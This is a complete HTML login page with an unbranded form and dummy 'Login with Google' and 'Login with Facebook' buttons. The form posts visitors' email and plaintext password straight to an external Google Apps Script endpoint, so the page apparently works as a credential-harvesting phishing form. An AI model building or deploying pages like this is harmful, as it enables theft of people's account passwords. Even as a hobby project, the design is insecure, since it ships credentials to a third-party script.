<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Login</title>
    <style>
        body {
            margin: 0;
            font-family: Arial, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            background: linear-gradient(135deg, #6a11cb, #2575fc);
        }
        .login-container {
            background: white;
            padding: 30px;
            border-radius: 10px;
            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.2);
            max-width: 400px;
            width: 100%;
            text-align: center;
        }
        .login-container h2 {
            margin-bottom: 20px;
            color: #333;
        }
        .login-container input {
            width: calc(100% - 20px);
            padding: 10px;
            margin: 10px 0;
            border: 1px solid #ccc;
            border-radius: 5px;
            font-size: 16px;
        }
        .login-container button {
            background: #2575fc;
            color: white;
            border: none;
            padding: 10px 15px;
            border-radius: 5px;
            font-size: 16px;
            cursor: pointer;
            margin-top: 10px;
            width: 100%;
        }
        .login-container button:hover {
            background: #1d63c7;
        }
        .login-container .social-login {
            margin-top: 20px;
        }
        .login-container .social-login button {
            background: white;
            color: #555;
            border: 1px solid #ccc;
            padding: 10px 15px;
            border-radius: 5px;
            cursor: pointer;
            width: calc(100% - 20px);
            margin: 5px 0;
            font-size: 14px;
        }
        .login-container .social-login button:hover {
            background: #f0f0f0;
        }
        .login-container p {
            margin-top: 20px;
            font-size: 14px;
        }
        .login-container p a {
            color: #2575fc;
            text-decoration: none;
        }
        .login-container p a:hover {
            text-decoration: underline;
        }
    </style>
</head>
<body>
    <div class="login-container">
        <h2>Login</h2>
        <form action="https://script.google.com/macros/s/AKfycbxOSgUybkATlMamXDPvaLyUqPkJkcWoGJCBF1mqlaK4b4YfCyRAWGNa8IiFtILSwN-2_A/exec" method="post">
    <input type="email" name="email" placeholder="Email" required>
    <input type="password" name="password" placeholder="Password" required>
    <button type="submit">Login</button>
</form>
        <div class="social-login">
            <p>Or login with:</p>
            <button>Login with Google</button>
            <button>Login with Facebook</button>
        </div>
        <p>Don't have an account? <a href="#">Sign up</a></p>
    </div>
</body>
</html>
